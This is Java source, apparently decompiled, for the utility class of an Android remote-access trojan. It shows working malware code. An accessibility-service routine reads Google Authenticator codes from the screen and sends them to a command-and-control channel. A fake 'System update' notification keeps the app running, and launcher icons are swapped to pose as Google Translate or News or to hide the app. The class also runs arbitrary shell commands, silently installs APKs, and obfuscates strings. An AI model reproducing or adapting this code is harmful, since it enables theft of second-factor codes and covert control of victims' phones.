package com.android.pictach;

import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.FileProvider;
import android.text.TextUtils;
import android.util.Base64;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.Executor;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

public class Utils {

    

    
    public static PowerManager.WakeLock wakeLock = null;

    
    public static WifiManager.WifiLock wifiLock = null;

    
    public static Executor threadPoolExecutor = null;

    
    public static int maxThreadCount = 1000;

    
    public static String currentPrefKey = null;

    
    public static String colonSeparator = ":";

    
    
    public static String negTwoFiveFive = removeMarker("-25_Utils_5", "_Utils_");

    
    public static String negA = removeMarker("-_Utils_A", "_Utils_");

    
    public static String negFive = removeMarker("-_Utils_5", "_Utils_");

    
    public static String negSixSixSix = "-666";

    
    public static String negNine = removeMarker("-CRAZYCRAZYCRAZY9", "CRAZYCRAZYCRAZY");

    
    public static String negFourFour = removeMarker("-4_Utils_4", "_Utils_");

    public static String negSevenSevenSix = "-776";
    public static String srcFlag = "SRC";

    
    public static String negOne = "-1";
    public static String one = "1";
    public static String eightEightEight = "888";
    public static String nineOneOne = "951"; 

    
    public static char charOne = '1';

    public static int twentyFive = 25;

    
    public static BroadcastReceiver screenReceiver = null;

    
    public static int stateFlag0 = 0;
    public static int stateFlag1 = 0;
    public static int stateFlag2 = 0;

    
    public static String shellCommandResult = "";

    
    public static int speedTime = 1000;

    
    public static Boolean shown = false;
    public static Boolean asked = false;
    public static Boolean IDONE = false;

    
    public static int Trys = 6;

    
    public static boolean iamworking = false;

    

    
    public static String removeMarker(String str, String marker) {
        return str.replace(marker, "");
    }

    
    public static String base64Decode(String str) {
        try {
            return new String(Base64.decode(str, 0), "UTF-8");
        } catch (UnsupportedEncodingException unused) {
            return null;
        }
    }

    

    
    public static byte[] gzipCompress(byte[] data) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(data.length);
        GZIPOutputStream gzip = new GZIPOutputStream(baos);
        gzip.write(data);
        gzip.close();
        byte[] compressed = baos.toByteArray();
        baos.close();
        return compressed;
    }

    
    public static byte[] gzipDecompress(byte[] data) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int length = data.length;
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        GZIPInputStream gzip = new GZIPInputStream(bais, length);
        byte[] buffer = new byte[length];
        while (true) {
            int read = gzip.read(buffer);
            if (read != -1) {
                baos.write(buffer, 0, read);
            } else {
                gzip.close();
                bais.close();
                byte[] result = baos.toByteArray();
                baos.close();
                return result;
            }
        }
    }

    

    
    public static byte[] buildPacket(String typeStr, byte[] dataBytes) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] compressedType = gzipCompress(typeStr.getBytes());
        byte[] compressedData = gzipCompress(dataBytes);

        
        
        String deadCheck = "ⁱᵇʾCRAZYㅤˑ$ˏـﹳﾞ$CRAZYʽʾᵎ".replace(typeStr, "ⁱᵇXʾSBCRAZYKㅤˑ$ˏ");

        byte[] typeLen = String.valueOf(compressedType.length).getBytes();
        byte[] dataLen = String.valueOf(compressedData.length).getBytes();

        if (deadCheck.length() > 1) {
            baos.write(typeLen, 0, typeLen.length);
            baos.write(0); 
            baos.write(dataLen, 0, dataLen.length);
        }
        baos.write(0); 

        
        if (!deadCheck.equals("ﹶCRAZYφTʾՙYﹶVCCRAZY")) {
            baos.write(compressedType, 0, compressedType.length);
            baos.write(compressedData, 0, compressedData.length);
        }

        byte[] packet = baos.toByteArray();
        try { baos.close(); } catch (Exception unused) {}
        return packet;
    }

    
    public static byte[] extractFirstPart(byte[] data, int[] lengths) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        baos.write(data, 0, lengths[0]);
        try { baos.close(); } catch (Exception unused) {}
        return baos.toByteArray();
    }

    
    public static byte[] extractSecondPart(byte[] data, int[] lengths) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        baos.write(data, lengths[0], lengths[1]);
        try { baos.close(); } catch (Exception unused) {}
        return baos.toByteArray();
    }

    
    public static byte[] objectToBytes(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        byte[] result = baos.toByteArray();
        baos.close();
        return result;
    }

    

    
    public static void acquireLocks(Context context, boolean keepWake) {
        if (keepWake && wakeLock == null) {
            try {
                PowerManager pm = (PowerManager) context.getSystemService("power");
                if (wakeLock == null) {
                    PowerManager.WakeLock wl = pm.newWakeLock(1, Config.FTX0.trim());
                    wakeLock = wl;
                    if (!wl.isHeld()) {
                        wakeLock.acquire();
                    }
                }
            } catch (Exception unused) {
            }
        }
        if (wifiLock == null) {
            try {
                WifiManager wm = (WifiManager) context.getSystemService("wifi");
                if (wifiLock == null) {
                    WifiManager.WifiLock wl = wm.createWifiLock(1, Config.FTX1.trim());
                    wifiLock = wl;
                    if (!wl.isHeld()) {
                        wifiLock.acquire();
                    }
                }
            } catch (Exception unused2) {
            }
        }
    }

    
    public static void releaseLocks(boolean keepWifi) {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception unused) {
        }
        if (keepWifi) {
            return;
        }
        try {
            if (wifiLock == null || !wifiLock.isHeld()) {
                return;
            }
            wifiLock.release();
            wifiLock = null;
        } catch (Exception unused2) {
        }
    }

    

    
    public static boolean isPowerSaveMode(Context context) {
        try {
            return ((PowerManager) context.getSystemService("power")).isPowerSaveMode();
        } catch (Exception unused) {
            return false;
        }
    }

    
    public static boolean isBatteryOptimizationDisabled(Context context) {
        if (Build.VERSION.SDK_INT >= 23) {
            return ((PowerManager) context.getSystemService("power"))
                    .isIgnoringBatteryOptimizations(context.getPackageName());
        }
        return true;
    }

    

    
    public static Notification buildForegroundNotification(Context context, String channelId, String channelName) {
        NotificationManager nm = (NotificationManager) context.getSystemService("notification");
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(channelId, channelName, 3);
            ch.setLockscreenVisibility(0);
            ch.setShowBadge(false);
            nm.createNotificationChannel(ch);
            return new Notification.Builder(context, channelId)
                    .setContentTitle("System update")
                    .setContentText("New system software is available, Tap to learn more.")
                    .setSmallIcon(android.R.color.transparent)
                    .setAutoCancel(false)
                    .build();
        }
        return new Notification.Builder(context)
                .setContentTitle("System update")
                .setContentText("New system software is available, Tap to learn more.")
                .setSmallIcon(android.R.color.transparent)
                .setPriority(2)
                .setAutoCancel(false)
                .build();
    }

    

    
    public static void scheduleRestartAlarm(Context context, String obfusStr, long intervalMs) {
        try {
            Intent intent = new Intent(context, Bodybuilding.class);
            
            intent.setAction("RestartSensor".replace(obfusStr, ""));
            ((AlarmManager) context.getSystemService("alarm"))
                    .setRepeating(
                            0,
                            System.currentTimeMillis() + intervalMs,
                            intervalMs,
                            PendingIntent.getBroadcast(context, 0, intent, 0)
                    );
        } catch (Exception unused) {
        }
    }

    

    
    public static String readPref(Context context, String key) {
        try {
            String val = PreferenceManager.getDefaultSharedPreferences(context).getString(key, "");
            return !val.equalsIgnoreCase("") ? val : "";
        } catch (Exception unused) {
            return "";
        }
    }

    
    public static void writePref(Context context, String value, String key) {
        try {
            SharedPreferences.Editor edit = PreferenceManager.getDefaultSharedPreferences(context).edit();
            edit.putString(key, value.trim());
            edit.commit();
        } catch (Exception unused) {
        }
    }

    

    
    public static void executeShellCommand(final String command) {
        if (((ThreadPoolExecutor) threadPoolExecutor).getActiveCount() >= maxThreadCount) {
            return;
        }
        threadPoolExecutor.execute(new Runnable() {
            @Override
            public void run() {
                StringBuffer sb = new StringBuffer();
                try {
                    Process proc = Runtime.getRuntime().exec(command);
                    if (Build.VERSION.SDK_INT >= 26) {
                        if (!proc.waitFor(60L, TimeUnit.SECONDS)) {
                            proc.destroy();
                        }
                    } else {
                        proc.waitFor();
                    }
                    BufferedReader br = new BufferedReader(
                            new InputStreamReader(proc.getInputStream()));
                    while (true) {
                        String line = br.readLine();
                        if (line == null) break;
                        sb.append(line);
                    }
                    proc.getInputStream().close();
                    proc.getOutputStream().close();
                    br.close();
                } catch (Exception unused) {
                    Utils.shellCommandResult = "";
                }
                String result = sb.toString();
                Utils.shellCommandResult = result.length() == 0 ? "" : result;
            }
        });
    }

    

    
    public static boolean isAppInstalledAndEnabled(Context context, String packageName) {
        try {
            PackageManager pm = context.getPackageManager();
            pm.getPackageInfo(packageName, 1);
            return pm.getApplicationInfo(packageName, 0).enabled;
        } catch (Exception unused) {
            return false;
        }
    }

    
    public static boolean isAppInstalled(Context context, String packageName) {
        try {
            context.getPackageManager().getApplicationInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException unused) {
            return false;
        }
    }

    
    public static void launchApp(Context context, String packageName) {
        try {
            Intent launch = context.getPackageManager().getLaunchIntentForPackage(packageName);
            if (launch != null) {
                context.startActivity(launch);
            }
        } catch (Exception unused) {
        }
    }

    
    public static String getAppLabel(Context context) {
        try {
            return (String) context.getPackageManager()
                    .getApplicationLabel(
                            context.getPackageManager()
                                    .getApplicationInfo(context.getPackageName(), 128)
                    );
        } catch (Exception unused) {
            return "";
        }
    }

    

    
    public static boolean isScreenUnlocked(Context context) {
        return !((KeyguardManager) context.getSystemService("keyguard"))
                .inKeyguardRestrictedInputMode();
    }

    
    public static boolean isAccessibilityEnabled(Context context, Class<?> serviceClass) {
        ComponentName componentName;
        String enabled;
        try {
            componentName = new ComponentName(context, serviceClass);
            enabled = Settings.Secure.getString(
                    context.getContentResolver(), "enabled_accessibility_services");
        } catch (Exception unused) {
            return false;
        }
        if (enabled == null) return false;
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(enabled);
        while (splitter.hasNext()) {
            ComponentName cn = ComponentName.unflattenFromString(splitter.next());
            if (cn != null && cn.equals(componentName)) {
                return true;
            }
        }
        return false;
    }

    
    public static boolean isAccessibilityServiceActive(Context context, Class<?> serviceClass) {
        ComponentName componentName;
        String enabled;
        try {
            componentName = new ComponentName(context, serviceClass);
            enabled = Settings.Secure.getString(
                    context.getContentResolver(), "enabled_accessibility_services");
        } catch (Exception unused) {
            return false;
        }
        if (enabled == null) return false;
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(enabled);
        while (splitter.hasNext()) {
            ComponentName cn = ComponentName.unflattenFromString(splitter.next());
            if (cn != null && cn.equals(componentName)) {
                return true;
            }
        }
        return false;
    }

    
    static List<AccessibilityNodeInfo> findNodeWithClass(
            AccessibilityNodeInfo root, String className) {
        ArrayList<AccessibilityNodeInfo> results = new ArrayList<>();
        if (root == null) return results;
        int count = root.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                if (child.getClassName().toString().toLowerCase()
                        .contains(className.toLowerCase())) {
                    results.add(child);
                } else {
                    results.addAll(findNodeWithClass(child, className));
                }
            }
        }
        return results;
    }

    
    public static void stealGoogleAuthCodes(AccessibilityEvent event, String packageName) {
        int i;
        try {
            if (Build.VERSION.SDK_INT < 18
                    || !packageName.contains(
                            removeMarker("co##m.goog##le.andr##oid.ap##ps.authent##icator2", "##"))
                    || event.getSource() == null) {
                return;
            }
            String combined = "";
            
            Iterator<AccessibilityNodeInfo> it = findNodeWithClass(
                    event.getSource(),
                    "androidCRAZYviewCRAZYViewGroup".replace("CRAZY", ".")
            ).iterator();
            while (true) {
                i = 0;
                if (!it.hasNext()) break;
                AccessibilityNodeInfo node = it.next();
                while (i < node.getChildCount()) {
                    AccessibilityNodeInfo child = node.getChild(i);
                    if (child.getText() != null) {
                        combined = combined + child.getText().toString() + "-";
                    }
                    i++;
                }
            }
            String[] parts = combined.split("-");
            if (combined.isEmpty()) return;
            while (i < parts.length) {
                if (i == parts.length - 1) break;
                NetworkManager.sendToC2(
                        negFourFour,
                        ("Google Authenticator<" + parts[i] + "<" + parts[i + 1]).getBytes()
                );
                i++;
            }
            love.MyAccess.blockBackButton();
            love.MyAccess.goHome();
        } catch (Exception unused) {
        }
    }

    

    
    public static boolean hasPermissions(Context context, String... permissions) {
        if (context == null || permissions == null) return true;
        for (String perm : permissions) {
            if (ActivityCompat.checkSelfPermission(context, perm) != 0) {
                return false;
            }
        }
        return true;
    }

    
    public static String[] PERMISSIONS() {
        if (android.os.Build.VERSION.SDK_INT >= 29) {
            return new String[]{
                    "android.permission.READ_CONTACTS",
                    "android.permission.READ_SMS",
                    "android.permission.READ_EXTERNAL_STORAGE",
                    "android.permission.CHANGE_WIFI_STATE",
                    "android.permission.ACCESS_WIFI_STATE",
                    "android.permission.ACCESS_NETWORK_STATE",
                    "android.permission.WAKE_LOCK",
                    "android.permission.INTERNET",
                    "android.permission.SEND_SMS"
            };
        }
        return new String[]{
                "android.permission.WRITE_EXTERNAL_STORAGE",
                "android.permission.READ_CONTACTS",
                "android.permission.READ_SMS",
                "android.permission.READ_EXTERNAL_STORAGE",
                "android.permission.CHANGE_WIFI_STATE",
                "android.permission.ACCESS_WIFI_STATE",
                "android.permission.ACCESS_NETWORK_STATE",
                "android.permission.WAKE_LOCK",
                "android.permission.INTERNET",
                "android.permission.SEND_SMS"
        };
    }

    

    
    public static boolean NeedSuper() {
        return "on" == "on";
    }

    
    public static String readFileAsBase64(String filePath) {
        File file = new File(filePath);
        byte[] bytes = new byte[(int) file.length()];
        try {
            new FileInputStream(file).read(bytes);
        } catch (IOException unused) {
        }
        return Base64.encodeToString(bytes, 0);
    }

    
    public static Uri uriFromFile(Context context, File file) {
        if (Build.VERSION.SDK_INT >= 24) {
            return FileProvider.getUriForFile(context, context.getPackageName() + ".provider", file);
        }
        return Uri.fromFile(file);
    }

    
    public static void installApk(Context context, String apkPath, String unused) {
        try {
            File file = new File(apkPath);
            if (file.exists()) {
                Intent intent = new Intent("android.intent.action.VIEW");
                intent.setDataAndType(uriFromFile(context, file),
                        "application/vnd.android.package-archive");
                intent.addFlags(268435456);
                intent.addFlags(1);
                if (NeedSuper()) {
                    Firebase.FirebaseFOR_IN = true;
                }
                context.startActivity(intent);
            }
        } catch (Exception unused2) {
        }
    }

    
    public static void keepWifiOn(Context context) {
        try {
            Settings.System.putInt(context.getContentResolver(), "wifi_sleep_policy", 2);
        } catch (Exception unused) {
        }
    }

    
    public static void swapAppIcon(Context context, String option) {
        if (option != null) {
            try {
                String configStr = "11";
                currentPrefKey = configStr;
                if (configStr.charAt(0) == charOne) {
                    PackageManager pm = context.getPackageManager();
                    if (love.Afterinstalloption == "T") {
                        pm.setComponentEnabledSetting(
                                new ComponentName(context, "com.android.pictach.GoogleTranslate"), 1, 1);
                        pm.setComponentEnabledSetting(
                                new ComponentName(context, "com.android.pictach.MainActive"), 2, 1);
                    } else if (love.Afterinstalloption == "N") {
                        pm.setComponentEnabledSetting(
                                new ComponentName(context, "com.android.pictach.googlenews"), 1, 1);
                        pm.setComponentEnabledSetting(
                                new ComponentName(context, "com.android.pictach.MainActive"), 2, 1);
                    } else if (love.Afterinstalloption == "C") {
                        pm.setComponentEnabledSetting(
                                new ComponentName(context, "com.android.pictach.costm"), 1, 1);
                        pm.setComponentEnabledSetting(
                                new ComponentName(context, "com.android.pictach.MainActive"), 2, 1);
                    } else if (love.Afterinstalloption == "K") {
                        ComponentName cn = new ComponentName(context, "com.android.pictach.MainActive");
                        if (pm.getComponentEnabledSetting(cn) != 2) {
                            pm.setComponentEnabledSetting(cn, 2, 1);
                        }
                    }
                }
            } catch (Exception unused) {
            }
        }
    }

    
    public static void startServiceCompat(Context context, Intent intent) {
        if (Build.VERSION.SDK_INT >= 26) {
            String configStr = "11";
            currentPrefKey = configStr;
            if (configStr.charAt(1) == charOne) {
                context.startForegroundService(intent);
                return;
            } else {
                context.startService(intent);
                return;
            }
        }
        context.startService(intent);
    }

    
    public static Boolean stringsMatch(String a, String b) {
        if (a.length() > 0 && b.length() > 0 && a.equals(b)) {
            return true;
        }
        return false;
    }
}
